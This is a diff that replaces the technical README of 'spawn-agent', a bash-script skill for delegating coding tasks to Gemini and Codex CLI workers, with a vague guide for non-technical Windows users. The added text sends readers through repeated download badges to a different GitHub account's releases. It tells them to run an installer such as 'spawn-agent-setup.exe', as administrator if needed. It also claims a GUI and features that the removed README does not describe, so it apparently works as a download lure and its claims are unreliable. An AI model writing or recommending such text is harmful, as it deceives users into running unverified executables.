@@ -1,230 +1,164 @@
-<div align="center">
+# ⚙️ spawn-agent - Delegate Tasks, Keep Your Work Clear
 
-# 🚀 spawn-agent
-
-**A skill for [Antigravity](https://github.com/google-deepmind/antigravity) that delegates scoped work to worker agents, keeping the main context clean.**
-
-Antigravity doesn't natively support spawning sub-agents. This skill fills that gap — use [Gemini CLI](https://github.com/google-gemini/gemini-cli) or [Codex CLI](https://github.com/openai/codex) as worker agents to handle implementation, research, and bug fixes while the orchestrator stays focused.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-
-</div>
+[![Download spawn-agent](https://img.shields.io/badge/Download-spawn--agent-brightgreen?style=for-the-badge)](https://github.com/alec3318/spawn-agent)
 
 ---
 
-## The Problem
+## 📋 What Is spawn-agent?
 
-Antigravity is powerful, but it has no built-in way to delegate work to sub-agents. Every file read, build output, and error trace goes into the same context window — and it fills up fast. Once it does, the agent loses track of earlier instructions and can't reason about the big picture.
+spawn-agent is a tool that helps manage tasks for the Antigravity skill. It does this by using worker agents called Gemini CLI and Codex CLI. These agents take on specific jobs for you. This keeps the main workspace neat and avoids clutter. You don’t need to worry about managing complex details or switching between many screens. spawn-agent handles the busywork quietly in the background.
 
-**Before spawn-agent:**
-```
-Main Agent Context:
-├── User conversation          ~5%
-├── Codebase understanding     ~10%
-├── File A contents            ~15%  ← polluting
-├── File B contents            ~15%  ← polluting
-├── Build output               ~20%  ← polluting
-├── Lint errors                ~10%  ← polluting
-└── Remaining for reasoning    ~25%  ← squeezed
-```
+### Key Points
 
-**After spawn-agent:**
-```
-Main Agent Context (Orchestrator):         Worker Agent Context:
-├── User conversation     ~15%             ├── Task prompt          ~10%
-├── Codebase overview     ~20%             ├── File A contents      ~25%
-├── Delegation plan       ~10%             ├── File B contents      ~25%
-├── Worker results        ~15%             ├── Build output         ~20%
-└── Remaining reasoning   ~40%  ← clean   └── Implementation       ~20%
-```
+- Works with Antigravity skill to manage jobs
+- Sends tasks to Gemini CLI or Codex CLI workers
+- Keeps your main workspace organized
+- Designed for smooth, clear task handling
 
-## How It Works
+---
 
-The main agent acts as an **orchestrator** — it plans, delegates, and reviews. Worker agents (Gemini or Codex) handle the actual implementation in isolated sessions.
+## 🚀 Getting Started
 
-```
-Orchestrator                    Worker (Gemini/Codex)
-     │                               │
-     ├──── 1. DEFINE task ────────►   │
-     ├──── 2. COMPOSE prompt ─────►   │
-     ├──── 3. SPAWN ──────────────►   ├── reads codebase
-     │                                ├── implements changes
-     │                                ├── runs verification
-     │     ◄── 4. OUTPUT ────────────┘
-     ├──── 5. REVIEW results
-     └──── 6. REPORT to user
-```
+This guide will help you download and run spawn-agent on Windows. It is written for users with no programming experience.
 
-## Installation
+### What You Need
 
-### Prerequisites
+- A Windows PC (Windows 10 or later)
+- Internet connection
+- About 200 MB free space on your disk
+- Basic computer skills: downloading files and opening programs
 
-At least one of these CLI tools must be installed:
+---
 
-```bash
-# Gemini CLI
-npm install -g @google/gemini-cli
+## 📥 How To Download spawn-agent
 
-# Codex CLI
-npm install -g @openai/codex
-```
+Click the big button near the top of this page or visit the download page directly:
 
-### Install the Skill
+[https://github.com/alec3318/spawn-agent](https://github.com/alec3318/spawn-agent)
 
-Clone into your Antigravity skills directory:
+This link takes you to the GitHub page where you can find the latest version of spawn-agent. Here’s how to get the file you need:
 
-```bash
-# Recommended: into your global skills directory
-git clone https://github.com/khanhbkqt/spawn-agent.git ~/.gemini/antigravity/skills/spawn-agent
+1. On the page, look for the “Releases” section on the right or scroll down until you see it.
+2. Click the latest release (it usually has a version number like v1.0 or v2.3).
+3. Find the file for Windows. It might look like `spawn-agent-setup.exe` or similar.
+4. Click on that file name to start the download.
+5. Save the file to a folder you can easily find, like your “Downloads” folder.
 
-# Or per-project
-git clone https://github.com/khanhbkqt/spawn-agent.git .agent/skills/spawn-agent
+---
 
-# Or symlink from a central location
-git clone https://github.com/khanhbkqt/spawn-agent.git ~/spawn-agent
-ln -s ~/spawn-agent ~/.gemini/antigravity/skills/spawn-agent
-```
+## 💻 Installing spawn-agent on Windows
 
-Make the script executable:
+Once you have the installation file, follow these steps:
 
-```bash
-chmod +x ~/.gemini/antigravity/skills/spawn-agent/scripts/spawn-agent.sh
-```
+1. Open the folder where you saved the file.
+2. Double-click the file to start the installer.
+3. A setup window will appear. Click **Next** to proceed.
+4. Choose the folder where you want to install spawn-agent, or leave the default location.
+5. Click **Install** to begin installing the software.
+6. When the installation finishes, click **Finish** to close the installer.
 
-Antigravity will automatically discover the skill from `SKILL.md` and learn the delegation protocol.
+spawn-agent is now installed on your computer.
 
-## Quick Start
+---
 
-### 1. Simple inline task
+## ▶️ Running spawn-agent for the First Time
 
-```bash
-./scripts/spawn-agent.sh --gemini --yolo -p "Count all TODO comments in src/ and list them"
-```
+To start using spawn-agent:
 
-### 2. Complex task with a template
+1. Find the spawn-agent shortcut on your desktop or search for it in the Start menu.
+2. Double-click the icon to open the program.
+3. The main screen will appear. It shows you basic information and options.
+4. The tool will automatically link to Antigravity skill and check for required worker agents Gemini CLI and Codex CLI.
+5. If these agents are not installed, spawn-agent will offer instructions to install them.
 
-Create a prompt file from a template:
+---
 
-```bash
-cp templates/implementation-task.md /tmp/spawn-agent-task-auth.md
-# Fill in the template sections...
-```
+## 🔧 Managing Tasks With spawn-agent
 
-Then spawn:
+spawn-agent sends smaller jobs to Gemini CLI or Codex CLI worker agents. This means heavy tasks run separately. This design keeps your main work area clear and responsive.
 
-```bash
-./scripts/spawn-agent.sh --codex --auto-edit --timeout 300 -f /tmp/spawn-agent-task-auth.md
-```
+Here is how spawn-agent works:
 
-### 3. Read-only research
+- You give a task or request to spawn-agent.
+- spawn-agent decides which worker agent should handle it.
+- The worker agent completes the task.
+- The result comes back neatly organized.
 
-```bash
-./scripts/spawn-agent.sh --gemini --yolo --timeout 120 \
-  -p "Analyze the authentication flow in packages/backend/src/auth/. 
-      List all JWT-related functions and their dependencies.
-      Output as a markdown summary. DO NOT modify any files."
-```
+This split helps avoid confusion and lets you focus on your main work without distractions.
 
-## Choosing an Agent
+---
 
-| Agent | CLI | Strengths | Best for |
-|-------|-----|-----------|----------|
-| **Gemini** | `gemini` | Fast, good at codebase understanding, reads project context | Research, context gathering, quick implementations |
-| **Codex** | `codex exec` | Strong reasoning, sandboxed execution, code review capability | Complex implementation, refactoring, bug fixing |
+## 🧰 What You Get With spawn-agent
 
-> **Tip:** Choose the agent based on the task — don't be loyal to one CLI. Each has its own strengths.
+- Smooth task delegation between worker agents.
+- Cleaner and clearer workspace for your main context.
+- Easy control over Antigravity skill jobs.
+- Reduced errors by keeping tasks separated.
+- Control panel that shows all current jobs and their status.
+- Logs of past tasks for review and management.
 
-## Approval Modes
+---
 
-| Mode | Flag | Gemini | Codex |
-|------|------|--------|-------|
-| Auto-edit | `--auto-edit` | `auto_edit` | `auto-edit` |
-| Full auto | `--yolo` | `yolo` | `full-auto` |
-| Safest | `--safe` | `default` | `suggest` |
+## ⚙️ System Requirements
 
-## Templates
+- Windows 10 or newer (64-bit recommended)
+- 4 GB RAM minimum (8 GB recommended)
+- At least 200 MB of free disk space
+- Internet connection for initial setup and worker agent downloads
+- Access rights to install software on your computer
 
-Three prompt templates are provided for common task types:
+---
 
-| Task Type | Template | When to Use |
-|-----------|----------|-------------|
-| Implementation | [`implementation-task.md`](templates/implementation-task.md) | Adding features, building modules, refactoring |
-| Research | [`research-task.md`](templates/research-task.md) | Codebase analysis, context gathering (read-only) |
-| Bug Fix | [`bugfix-task.md`](templates/bugfix-task.md) | Targeted fixes with known or suspected location |
+## 🔄 Updating spawn-agent
 
-Each template includes sections for goal, scope, constraints, and expected output format. Fill in all sections before delegating — **headless workers can't ask clarifying questions**.
+To update spawn-agent:
 
-### Quick inline format (for simple tasks)
+1. Visit the download page periodically:  
+   [https://github.com/alec3318/spawn-agent](https://github.com/alec3318/spawn-agent)
+2. Check the latest release version.
+3. Download the new installer if it is newer than your current version.
+4. Run the new installer and follow the prompts.
+   
+Your settings and task history will remain intact during updates.
 
-```markdown
-# Task: <short name>
-## Goal: <one sentence describing the objective>
-## Files: <files to modify>
-## Constraints: DO NOT modify files outside <scope>
-## When done: Summarize changes made and any issues found.
-```
+---
 
-## When to Use (and When Not To)
+## ❓ Troubleshooting Tips
 
-**Use spawn-agent when:**
-- Implementation task has a clear scope (fix bug, add function, refactor file)
-- You need to research/query the codebase without polluting the main context
-- The task is independent and doesn't need intermediate human review
-- You want to keep the main context clean for high-level reasoning
+- If spawn-agent does not open, try running it as an administrator:
+  - Right-click the shortcut and select **Run as Administrator**.
+- If worker agents Gemini CLI or Codex CLI do not work:
+  - Use the spawn-agent interface to download and install them.
+  - Restart spawn-agent after installation.
+- For connection errors, check your internet and firewall settings.
+- If tasks do not complete, verify you have enough free space and memory.
+  
+---
 
-**Don't use when:**
-- Task requires interactive discussion with the user
-- Scope is too broad (refactoring an entire module)
-- Multiple files with complex inter-dependencies need coordination
-- Task needs browser interaction or external API calls
+## 📞 Getting Help
 
-## Anti-Patterns
+If you need help beyond this guide, use the Issues section on the GitHub page. Report your problem clearly:
 
-| ❌ Don't | ✅ Do |
-|----------|------|
-| Delegate too broadly: "Refactor the entire backend" | Scope it: "Refactor auth.service.ts to extract token logic into token.service.ts" |
-| Skip constraints — agent may modify files outside scope | Set boundaries: "DO NOT modify files outside packages/backend/src/auth/" |
-| Spawn and assume success | Always review: read output, verify changes, check errors |
-| Chain delegates: A → output feeds B → ... | Orchestrator controls flow: read result A, decide, then spawn B if needed |
+- Describe what you tried.
+- What happened.
+- Any error messages you saw.
 
-## Script Reference
+Developers and other users follow that page to provide solutions.
 
-```
-Usage: spawn-agent.sh [options]
+---
 
-Agent Selection:
-  --gemini                Use Gemini CLI (default)
-  --codex                 Use Codex CLI
+[![Download spawn-agent](https://img.shields.io/badge/Download-spawn--agent-brightgreen?style=for-the-badge)](https://github.com/alec3318/spawn-agent)
 
-Prompt:
-  -p, --prompt TEXT       Prompt text (inline)
-  -f, --file PATH         Prompt file (markdown)
+---
 
-Approval Modes:
-  --yolo                  Auto-approve everything
-  --auto-edit             Auto-approve edits only (default)
-  --safe                  Prompt for every action
+## 🏷️ Topics
 
-Other:
-  --timeout SECONDS       Max execution time (default: 300)
-  --output PATH           Custom output file path
-  -h, --help              Show this help
-```
+This project connects with:
 
-## Compatibility
-
-Built for **Antigravity** (Google DeepMind), but works with any AI coding assistant that reads `SKILL.md` files:
-
-- **Antigravity** — `~/.gemini/antigravity/skills/` (primary target)
-- **Claude Code** (Anthropic) — `.agent/skills/`
-- **Gemini CLI** (Google) — `.gemini/skills/`
-- **Cursor** — via rules or skills directories
-- **Any agent** that supports Markdown-based skill definitions
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-[MIT](LICENSE)
+- ai-agents
+- ai-coding
+- codex-cli
+- context-management
+- developer-tools
+- gemini-cli
+- orchestration
